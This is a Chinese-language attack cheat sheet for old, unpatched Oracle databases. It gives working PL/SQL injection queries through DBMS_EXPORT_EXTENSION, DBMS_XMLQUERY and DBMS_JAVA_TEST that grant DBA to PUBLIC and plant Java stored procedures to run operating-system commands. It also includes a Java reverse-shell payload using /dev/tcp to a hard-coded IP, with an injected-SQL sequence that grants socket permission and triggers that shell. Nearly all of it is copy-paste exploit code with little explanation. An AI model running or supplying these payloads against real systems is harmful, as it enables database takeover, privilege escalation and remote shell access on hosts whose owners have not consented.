# 利用漏洞提权命令执行

## dbms_export_extension()

- **影响版本：**Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE (Fixed in CPU July 2006)

- **权限：**None

- **详情：**这个软件包有许多易受 PL/SQL 注入攻击的函数。这些函数由 SYS 拥有，作为 SYS 执行并且可由 PUBLIC 执行。因此，如果 SQL 注入处于上述任何未修补的 Oracle 数据库版本中，那么攻击者可以调用该函数并直接执行 SYS 查询。

### 提升权限

该请求将导致查询 "GRANT DBA TO PUBLIC" 以 SYS 身份执行。因为这个函数允许 PL / SQL 缺陷（PL / SQL 注入）。一旦这个请求成功执行，PUBLIC 获取 DBA 角色，从而提升当前 user 的特权

```sql
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual
```

### 使用Java执行

```sql
# 创建java库
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual

# 赋予Java权限
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual

# 创建函数
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual

# 赋予函数执行权限
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual

# 执行系统命令
select sys.LinxRunCMD('/bin/bash -c /usr/bin/whoami') from dual
```

## dbms_xmlquery.newcontext()

- 影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE (Fixed in CPU July 2006)

- 必须在 DBMS_PORT_EXTENSION 存在漏洞情况下，否则赋予权限时无法成功 

```sql
# 创建java库
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;

# 赋予当前用户Java权限
select user from dual
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''YY'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual;

# 查看 all_objects 内部改变
select * from all_objects where object_name like '%LINX%' or object_name like '%Linx%'

# 创建函数
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;

# 判断是否创建成功
select OBJECT_ID from all_objects where object_name ='LINXRUNCMD'

# 执行命令
select LinxRunCMD('id') from dual

# 删除函数
drop function LinxRunCMD
```

## dbms_java_test.funcall()

- 影响版本：10g R2, 11g R1, 11g R2

- 权限：Java Permissions

```sql
Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pwd > /tmp/pwd.txt') from dual;
执行会有一定报错，但是不影响命令执行
```

# Java反弹shell

```java
# linux系统payload
import java.io.*;
import java.net.*;
public class shellRev
{
        public static void main(String[] args)
        {
                System.out.println(1);
                try{run();}
                catch(Exception e){}
        }
public static void run() throws Exception
        {
                String[] aaa={"/bin/bash","-c","exec 9<> /dev/tcp/192.168.1.50/8080;exec 0<&9;exec 1>&9 2>&1;/bin/sh"};
                Process p=Runtime.getRuntime().exec(aaa);
    }
}

#编译
javac shellRev.java
#执行
java shellRev

```

```sql
# 创建 Java 库
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell {public static void run() throws Exception{String[] aaa={"/bin/bash","-c","exec 9<> /dev/tcp/127.0.0.1/8080;exec 0<&9;exec 1>&9 2>&1;/bin/sh"};Process p=Runtime.getRuntime().exec(aaa);}}'''';END;'';END;--','SYS',0,'1',0) from dual

# 赋予Java权限
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''<>'''''''', ''''''''*'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual

# 创建函数
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual

# 赋予函数执行权限
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--','SYS',0,'1',0) from dual

# 反弹shell
select sys.reversetcp from dual
```

